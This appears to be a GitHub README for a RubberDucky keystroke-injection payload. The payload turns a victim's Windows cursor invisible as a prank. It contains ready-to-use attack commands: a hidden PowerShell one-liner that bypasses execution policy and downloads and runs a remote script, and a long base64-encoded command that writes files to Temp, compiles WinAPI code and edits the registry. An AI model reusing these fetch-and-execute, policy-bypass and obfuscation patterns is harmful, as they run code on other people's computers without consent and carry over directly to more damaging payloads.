# RD-NoCursing

A RubberDucky script that turns your cursor invisible and will leave your friends cursing in front of their computers

## Method IWR

This script starts off by using the Invoke-WebRequest to download and execute the NoCurs.ps1.

The NoCurs.ps1 will then
1. Create a Nocur.zip file in your Temp-Folder (The Data for the .zip file is encoded in the Script itself)
2. Extract the NoCur.cur (which is basically an empty icon for the cursor)
3. It will define a C# class for calling WinAPI
4. Change the cursor to the recently extracted NoCur.cur in the registry
5. Inform the system that the cursor icon changed so that the visuals can be updated 
6. Exit

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
```
STRINGLN powershell -w h -NoP -NonI -Exec Bypass $d = iwr https://raw.githubusercontent.com/CE-Red/RD-NoCursor/main/NoCurs.ps1?dl=1; invoke-expression $d
```

## Method B64

This method is much slower because your device needs to type the whole NoCurs.ps1 script in a hidden Powershell window,
but it doesn't need to download any files or code. So it may bypass some restrictions.

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
```
STRINGLN powershell -NoP -NonI -w h
DELAY 750
STRINGLN powershell.exe -enc JABiADYANAAgAD0AIAAiAFUARQBzAEQAQgBCAFEAQQBBAEEAQQBJAEEAQgB5AFkATgBGAGIAcQBYADAAUwBSAE8AUQBBAEEAQQBMADQAUQBBAEEAQQBKAEEAQQBBAEEAVABtADkARABkAFgASQB1AFkAMwBWAHkANwBjAG0AeABEAFkAQQB3AEUARQBQAFIAZgAwAHkAUQBpAHYAcABLAHgAcwBoAG8AagBKAE0AdABrAHcATwBHAFMATQBGAC8AawBtAFgASgBoAG8ATQBnAGsAOQBkAG8AYwBGAFoAZgBsAFcAZgBxAGwAZQBBADcANwA0AFkAawBTAFoASQBrAFMAZgBxAGgAdQBkAGsAQwBVAEUAcwBCAEEAaABRAEEARgBBAEEAQQBBAEEAZwBBAEgASgBnADAAVgB1AHAAZgBSAEoARQA1AEEAQQBBAEEAdgBoAEEAQQBBAEEAawBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBnAEEAQQBBAEEAQQBBAEEAQQBBAEUANQB2AFEAMwBWAHkATABtAE4AMQBjAGwAQgBMAEIAUQBZAEEAQQBBAEEAQQBBAFEAQQBCAEEARABjAEEAQQBBAEIAZwBBAEEAQQBBAEEAQQBBAD0AIgANAAoADQAKACQAZgBpAGwAZQBuAGEAbQBlACAAPQAgACgAJABlAG4AdgA6AHQAZQBtAHAAKQArACIAXABOAG8AYwB1AHIALgB6AGkAcAAiADsADQAKAA0ACgAkAGIAeQB0AGUAcwAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgA2ADQAKQANAAoAPgA+ACAAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAkAGYAaQBsAGUAbgBhAG0AZQAsACAAJABiAHkAdABlAHMAKQAgACAAIAAgAA0ACgANAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMgA7AA0ACgANAAoARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAJABmAGkAbABlAG4AYQBtAGUAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAJABFAG4AdgA6AHQAZQBtAHAAOwAgACAADQAKAA0ACgBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAyADsADQAKAA0ACgBBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgAEAAJwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABTAHkAcwBQAGEAcgBhAG0AcwBJAG4AZgBvACAAewANAAoAIAAgACAAIABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgAsACAARQBuAHQAcgB5AFAAbwBpAG4AdAAgAD0AIAAiAFMAeQBzAHQAZQBtAFAAYQByAGEAbQBlAHQAZQByAHMASQBuAGYAbwAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwB5AHMAdABlAG0AUABhAHIAYQBtAGUAdABlAHIAcwBJAG4AZgBvACgAdQBpAG4AdAAgAHUAaQBBAGMAdABpAG8AbgAsACAAdQBpAG4AdAAgAHUAaQBQAGEAcgBhAG0ALAAgAHUAaQBuAHQAIABwAHYAUABhAHIAYQBtACwAIAB1AGkAbgB0ACAAZgBXAGkAbgBJAG4AaQApADsADQAKACAAIAAgACAADQAKACAAIAAgACAAYwBvAG4AcwB0ACAAaQBuAHQAIABTAFAASQBfAFMARQBUAEMAVQBSAFMATwBSAFMAIAA9ACAAMAB4ADAAMAA1ADcAOwANAAoAIAAgACAAIABjAG8AbgBzAHQAIABpAG4AdAAgAFMAUABJAEYAXwBVAFAARABBAFQARQBJAE4ASQBGAEkATABFACAAPQAgADAAeAAwADEAOwANAAoAIAAgACAAIABjAG8AbgBzAHQAIABpAG4AdAAgAFMAUABJAEYAXwBTAEUATgBEAEMASABBAE4ARwBFACAAPQAgADAAeAAwADIAOwANAAoADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAHYAbwBpAGQAIABDAHUAcgBzAG8AcgBIAGEAcwBDAGgAYQBuAGcAZQBkACgAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQBQAGEAcgBhAG0AZQB0AGUAcgBzAEkAbgBmAG8AKABTAFAASQBfAFMARQBUAEMAVQBSAFMATwBSAFMALAAgADAALAAgADAALAAgAFMAUABJAEYAXwBVAFAARABBAFQARQBJAE4ASQBGAEkATABFACAAfAAgAFMAUABJAEYAXwBTAEUATgBEAEMASABBAE4ARwBFACkAOwANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAnAEAADQAKAA0ACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsAQwBVADoAXABDAG8AbgB0AHIAbwBsACAAUABhAG4AZQBsAFwAQwB1AHIAcwBvAHIAcwAnACAALQBOAGEAbQBlACAAJwBBAHIAcgBvAHcAJwAgAC0AVgBhAGwAdQBlACAAJwAlAFQARQBNAFAAJQBcAE4AbwBDAHUAcgAuAGMAdQByACcAOwANAAoADQAKAFsAUwB5AHMAUABhAHIAYQBtAHMASQBuAGYAbwBdADoAOgBDAHUAcgBzAG8AcgBIAGEAcwBDAGgAYQBuAGcAZQBkACgAKQA=;exit
```

<p align="right">(<a href="#top">back to top</a>)</p>

## How to reverse the changes

Just open the control panel and navigate to "Mouse".
There you can change the icon back to normal.

## Contributing

All contributors names will be listed here:

zett42 - He created the part where the C# class calls the WinAPI to display the new cursor.
* [Changing Windows 10 cursor icon with Powershell without reseting](https://stackoverflow.com/questions/71089070/changing-windows-10-cursor-icon-with-powershell-without-reseting)

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [I-Am-Jakoby](https://github.com/I-Am-Jakoby/)

<p align="right">(<a href="#top">back to top</a>)</p>
